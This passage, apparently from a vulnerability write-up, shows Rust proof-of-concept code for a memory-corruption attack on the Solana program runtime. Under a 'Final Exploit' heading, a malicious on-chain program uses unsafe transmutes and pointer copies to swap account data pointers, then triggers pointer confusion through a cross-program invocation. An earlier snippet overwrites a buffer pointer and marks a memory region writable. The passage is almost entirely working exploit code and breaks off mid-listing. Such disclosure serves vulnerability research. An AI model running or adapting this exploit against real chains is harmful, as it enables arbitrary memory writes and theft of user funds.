<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">let</span><span> thread_mem </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x48</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">21</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span></span><span class="token token" style="color:#999">// Overwrite POINTER account&#x27;s backing buffer pointer (arb_ptr)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span></span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x490</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> thread_mem</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span></span><span class="token token" style="color:#999">// Set memory region state to writable</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span></span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">(</span><span>data_ptr </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">0x4b8</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span></code></div></div></pre>
<h3 class="text-2xl sm:text-3xl mt-6 mb-2 text-white">Final Exploit</h3>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">Putting them all together, here&#x27;s the final PoC:</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>ptr</span><span class="token token" style="color:#ccc">,</span><span> mem</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#e2777a">rc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#e2777a">cell</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span></span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">solana_program</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#e2777a">account_info</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>    </span><span class="token token" style="color:#e2777a">instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>    </span><span class="token token" style="color:#e2777a">program</span><span class="token token" style="color:#ccc">::</span><span>invoke_signed</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>    entrypoint</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#e2777a">entrypoint</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>    </span><span class="token token" style="color:#e2777a">pubkey</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span></span><span class="token token macro" style="color:#f8c555">entrypoint!</span><span class="token token" style="color:#ccc">(</span><span>process_instruction</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span></span><span class="token token" style="color:#999">// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span></span><span class="token token" style="color:#999">// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span></span><span class="token token" style="color:#999">// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">process_instruction</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>    program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>    _instruction_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> accounts</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">8</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> swap_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> pointer_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> leverage_idx </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">6</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>        </span><span class="token token" style="color:#999">// Prepare LEVERAGE and SWAP accounts to set up memory layout</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span>        </span><span class="token token" style="color:#999">// Resize LEVERAGE to simplify exploit logic</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">32</span><span>        accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">realloc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">33</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">34</span><span>        </span><span class="token token" style="color:#999">// Overwrite SWAP&#x27;s data pointer with LEVERAGE&#x27;s pointer</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">35</span><span>        </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">36</span><span>            </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">37</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>leverage_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">38</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">39</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">40</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">41</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">42</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">43</span><span>        </span><span class="token token" style="color:#999">// Invoke CPI call to trigger pointer confusion</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">44</span><span>        </span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">45</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">46</span><span>                </span><span class="token token" style="color:#67cdcc">*</span><span>program_id</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">47</span><span>                </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">48</span><span>                </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">49</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">50</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span>swap_idx</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">51</span><span>            </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
